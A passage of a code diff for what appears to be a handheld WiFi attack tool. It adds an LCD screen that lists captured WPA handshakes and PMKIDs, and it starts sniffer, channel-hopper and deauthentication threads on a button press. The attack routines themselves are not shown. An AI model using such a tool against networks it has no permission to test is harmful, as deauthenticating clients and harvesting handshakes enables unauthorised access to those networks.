+    d = ScaledDraw(img)
+
+    captures = _list_captures()
+    count = len(captures)
+
+    # Header
+    d.rectangle((0, 0, 127, 13), fill="#112211")
+    d.text((2, 1), f"CAPTURES ({count})", font=font_sm, fill="#00FF00")
+
+    if not captures:
+        d.text((4, 40), "No captures yet", font=font_sm, fill="#666")
+        d.text((4, 55), "Start hunting!", font=font_sm, fill="#444")
+    else:
+        visible = captures[scroll:scroll + 7]
+        for i, fname in enumerate(visible):
+            y = 16 + i * 14
+            # Determine type by prefix for color coding
+            name_display = fname.replace(".pcap", "")
+            if fname.startswith("hs4_"):
+                color = "#00FF00"   # green = full handshake
+                prefix = "!"
+            elif fname.startswith("hs_half_"):
+                color = "#FFAA00"   # yellow = half handshake
+                prefix = "~"
+            elif fname.startswith("pmkid_"):
+                color = "#FF00FF"   # purple = PMKID
+                prefix = "*"
+            else:
+                color = "#CCCCCC"
+                prefix = " "
+            d.text((2, y), f"{prefix} {name_display[:21]}",
+                   font=font_sm, fill=color)
+
+    # Footer
+    d.rectangle((0, 116, 127, 127), fill="#111")
+    d.text((2, 117), "U/D:Scroll K1:View K3:Back",
+           font=font_sm, fill="#888")
+    lcd.LCD_ShowImage(img, 0, 0)
+
+
+# ---------------------------------------------------------------------------
+# LCD Drawing -- Whitelist view
+# ---------------------------------------------------------------------------
 
 
 def _draw_whitelist(lcd, font_obj, font_sm, scroll):
@@ -885,7 +1241,8 @@ def _draw_whitelist(lcd, font_obj, font_sm, scroll):
             d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")
 
     d.rectangle((0, 116, 127, 127), fill="#111")
-    d.text((2, 117), f"{len(lines)} entries K1:View K3:X", font=font_sm, fill="#888")
+    d.text((2, 117), f"{len(lines)} entries K1:View K3:X",
+           font=font_sm, fill="#888")
     lcd.LCD_ShowImage(img, 0, 0)
 
 
@@ -893,10 +1250,12 @@ def _draw_whitelist(lcd, font_obj, font_sm, scroll):
 # Main
 # ---------------------------------------------------------------------------
 
+
 def main():
     global _running, capturing, deauth_enabled, stealth_enabled
-    global mon_iface, view, original_mac
+    global mon_iface, view, original_mac, capture_flash
 
+    capture_flash = 0  # ensure no residual flash from previous run
     os.makedirs(HANDSHAKE_DIR, exist_ok=True)
     _load_stats()
     _load_config()
@@ -944,6 +1303,9 @@ def main():
         GPIO.cleanup()
         return 1
 
+    # Start activity sampler thread
+    threading.Thread(target=_activity_sampler, daemon=True).start()
+
     scroll = 0
 
     try:
@@ -960,10 +1322,12 @@ def main():
             elif btn == "OK":
                 if not capturing:
                     capturing = True
-                    threading.Thread(target=_channel_hopper, daemon=True).start()
+                    threading.Thread(target=_channel_hopper,
+                                    daemon=True).start()
                     threading.Thread(target=_sniffer, daemon=True).start()
                     threading.Thread(target=_deauther, daemon=True).start()
-                    threading.Thread(target=_half_hs_checker, daemon=True).start()
+                    threading.Thread(target=_half_hs_checker,
+                                    daemon=True).start()
                 else:
                     capturing = False
                 time.sleep(0.3)
@@ -974,10 +1338,12 @@ def main():
                 time.sleep(0.3)
 
             elif btn == "KEY1":
-                # Cycle views
+                # Cycle views: face > stats > captures > whitelist
                 if view == "face":
                     view = "stats"
                 elif view == "stats":
+                    view = "captures"
+                elif view == "captures":
                     view = "whitelist"
                 else:
                     view = "face"
@@ -1007,6 +1373,8 @@ def main():
                 _draw_face(lcd, font_obj, font_sm)
             elif view == "stats":
                 _draw_stats(lcd, font_obj, font_sm, scroll)
+            elif view == "captures":
+                _draw_captures(lcd, font_obj, font_sm, scroll)
             elif view == "whitelist":
                 _draw_whitelist(lcd, font_obj, font_sm, scroll)
 
